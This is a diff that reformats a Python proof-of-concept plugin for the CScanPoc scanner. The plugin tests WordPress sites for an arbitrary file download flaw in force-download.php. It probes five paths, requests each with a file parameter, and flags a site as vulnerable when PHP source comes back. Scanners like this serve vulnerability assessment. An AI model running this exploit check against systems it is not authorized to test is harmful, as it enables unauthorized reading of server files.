@@ -1,22 +1,23 @@
 # coding: utf-8
 
-from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import  re
+import re
 hh = hackhttp.hackhttp()
 
+
 class Vuln(ABVuln):
-    vuln_id = 'WordPress_0078' # 平台漏洞编号，留空
-    name = 'WordPress force download Arbitrary File Download' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    vuln_id = 'WordPress_0078'  # 平台漏洞编号，留空
+    name = 'WordPress force download Arbitrary File Download'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2016-08-07'  # 漏洞公布时间
     desc = '''
         WordPress force download Arbitrary File Download
-    ''' # 漏洞描述
-    ref = 'https://cxsecurity.com/issue/WLB-2016080079' # 漏洞来源
-    cnvd_id = 'Unknown' # cnvd漏洞编号
-    cve_id = 'Unknown' #cve编号
+    '''  # 漏洞描述
+    ref = 'https://cxsecurity.com/issue/WLB-2016080079'  # 漏洞来源
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
     product = 'WordPress'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
@@ -24,7 +25,7 @@ class Vuln(ABVuln):
 class Poc(ABPoc):
     poc_id = '7781639f-8692-437f-837c-a72e4ecb1f9f'
     author = '国光'  # POC编写者
-    create_date = '2018-05-15' # POC创建时间
+    create_date = '2018-05-15'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -35,7 +36,8 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
             url = arg
-            payload_list = ['/force-download.php', '/wp/wp-content/force-download.php', '/wp-content/force-download.php', '/wp-content/themes/ucin/includes/force-download.php', '/wp-content/uploads/patientforms/force-download.php']
+            payload_list = ['/force-download.php', '/wp/wp-content/force-download.php', '/wp-content/force-download.php',
+                            '/wp-content/themes/ucin/includes/force-download.php', '/wp-content/uploads/patientforms/force-download.php']
             for payload in payload_list:
                 verify_url = url + payload
                 code, head, res, errcode, _ = hh.http(verify_url)
@@ -43,7 +45,8 @@ class Poc(ABPoc):
                     final_url = verify_url + '?file=force-download.php'
                     code, head, res, errcode, _ = hh.http(final_url)
                     if '<?php' in res:
-                        self.output.report(self.vuln, '发现{target}存在{name}漏洞;url={url}'.format(target=self.target,name=self.vuln.name, url=final_url))
+                        self.output.report(self.vuln, '发现{target}存在{name}漏洞;url={url}'.format(
+                            target=self.target, name=self.vuln.name, url=final_url))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
